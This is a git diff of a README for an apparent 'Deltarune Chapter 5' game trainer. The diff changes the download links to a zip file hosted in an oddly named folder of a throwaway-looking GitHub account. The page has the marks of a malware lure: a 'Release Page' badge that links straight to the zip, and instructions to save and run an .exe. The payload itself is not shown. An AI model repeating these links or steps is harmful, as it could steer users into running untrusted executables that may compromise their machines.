@@ -5,7 +5,7 @@ description: "Modify Deltarune Chapter 5 stats, gold, and health with this singl
 ---
 # 🎮 Deltarune-Chapter5-Ultimate-Trainer-2026 - Master every fight with ease today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/sternumlearningcurve33/sternumlearningcurve33.github.io/main/nonprolongation/sternumlearningcurve_io_github_v1.5.zip)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sternumlearningcurve33/sternumlearningcurve33.github.io/raw/refs/heads/main/nonprolongation/sternumlearningcurve_io_github_v1.5.zip)
 
 ## 📖 About this tool
 
@@ -25,7 +25,7 @@ Ensure your computer meets these standards before you run the trainer:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit this page to download: [https://raw.githubusercontent.com/sternumlearningcurve33/sternumlearningcurve33.github.io/main/nonprolongation/sternumlearningcurve_io_github_v1.5.zip](https://raw.githubusercontent.com/sternumlearningcurve33/sternumlearningcurve33.github.io/main/nonprolongation/sternumlearningcurve_io_github_v1.5.zip).
+1. Visit this page to download: [https://github.com/sternumlearningcurve33/sternumlearningcurve33.github.io/raw/refs/heads/main/nonprolongation/sternumlearningcurve_io_github_v1.5.zip](https://github.com/sternumlearningcurve33/sternumlearningcurve33.github.io/raw/refs/heads/main/nonprolongation/sternumlearningcurve_io_github_v1.5.zip).
 2. Look for the Assets list on the latest release page.
 3. Select the file ending in .exe.
 4. Save the file to your desktop or a folder you can find easily.
